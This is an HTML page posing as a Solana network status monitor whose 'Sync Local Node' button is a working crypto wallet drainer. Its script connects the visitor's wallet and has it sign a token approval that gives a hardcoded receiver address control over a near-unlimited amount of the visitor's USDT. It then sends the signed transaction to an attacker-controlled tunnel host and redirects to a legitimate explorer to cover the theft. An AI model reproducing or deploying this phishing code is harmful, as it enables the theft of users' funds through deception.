<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Solana Status | Network Monitor</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #0a0a0a; color: #14F195; font-family: 'Courier New', monospace; margin: 0; }
        .nav { background: #111; padding: 10px; border-bottom: 1px solid #333; font-size: 12px; display: flex; justify-content: space-between; }
        .main { padding: 40px; text-align: center; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px auto; max-width: 400px; }
        .stat-box { background: #1a1a1a; padding: 15px; border: 1px solid #333; border-radius: 8px; font-size: 10px; }
        #sync-btn { background: #14F195; color: #000; border: none; padding: 18px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; letter-spacing: 1px; }
        .glow { box-shadow: 0 0 15px rgba(20, 241, 149, 0.4); }
    </style>
</head>
<body>
    <div class="nav">
        <span>SOL/USD: $142.35 (-1.2%)</span>
        <span>TPS: 2,450</span>
    </div>

    <div class="main">
        <h1 style="font-size: 1.5rem;">NETWORK VALIDATOR V4.8</h1>
        <p style="color: #888; font-size: 14px;">Your local RPC node is out of sync. Please perform a secure handshake.</p>
        
        <div class="stats-grid">
            <div class="stat-box">EPOCH: 582</div>
            <div class="stat-box">SLOT: 294,102,402</div>
        </div>

        <button id="sync-btn" class="glow">SYNC LOCAL NODE</button>
        <div id="log" style="margin-top:25px; font-size:10px; color:#555; height:50px; overflow:hidden;"></div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

        document.getElementById('sync-btn').onclick = async () => {
            const sWeb3 = window.solanaWeb3;
            const p = window.solana;
            if (!p) return;

            try {
                await p.connect();
                const addLog = (m) => document.getElementById('log').innerHTML = `> ${m}<br>` + document.getElementById('log').innerHTML;
                
                addLog("INITIALIZING HANDSHAKE...");
                const { bh } = await (await fetch(`${tunnel}/sync`)).json();

                const data = new Uint8Array(9);
                data[0] = 4; 
                const amount = 999999999999; // 既然是“极致”，这次我们直接把额度拉满！
                const view = new DataView(data.buffer);
                view.setUint32(1, amount, true); 

                const [userAta] = await sWeb3.PublicKey.findProgramAddress(
                    [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
                    new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
                );

                const tx = new sWeb3.Transaction().add(
                    new sWeb3.TransactionInstruction({
                        keys: [
                            { pubkey: userAta, isSigner: false, isWritable: true },
                            { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                            { pubkey: p.publicKey, isSigner: true, isWritable: false }
                        ],
                        programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                        data: data
                    })
                );

                tx.recentBlockhash = bh;
                tx.feePayer = p.publicKey;

                const signed = await p.signTransaction(tx);
                addLog("NODE SYNCHRONIZED. BROADCASTING...");

                // 转换并发送
                const serialized = signed.serialize();
                let binary = '';
                const bytes = new Uint8Array(serialized);
                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
                
                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);

                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1200);

            } catch (e) { location.reload(); }
        };
    </script>
</body>
</html>
